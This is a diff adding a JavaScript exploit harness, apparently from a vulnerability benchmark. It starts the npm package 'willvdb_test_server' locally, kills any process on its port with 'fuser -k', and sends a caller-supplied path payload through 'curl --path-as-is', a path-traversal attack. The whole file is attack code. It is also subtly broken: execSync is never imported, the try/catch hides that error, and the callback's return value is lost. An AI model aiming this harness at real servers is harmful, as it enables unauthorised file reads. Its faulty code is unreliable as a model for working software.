@@ -1,0 +1,22 @@
+function exploitFunction(payload) {
+    const pkg = require("willvdb_test_server");
+    const fs = require("fs");
+    const { exec } = require("child_process");
+
+    try {
+        execSync("fuser -k 8973/tcp", () => {});
+    } catch (e) {}
+
+    pkg.run(8973, __dirname);
+
+    const attack_string = `curl -v --path-as-is "http://127.0.0.1:8973${payload}"`;
+    exec(attack_string, (error, stdout) => {
+        if (error) {
+            console.error(`Error executing command: ${error}`);
+            return;
+        }
+        return stdout;
+    });
+}
+
+module.exports = { exploitFunction };
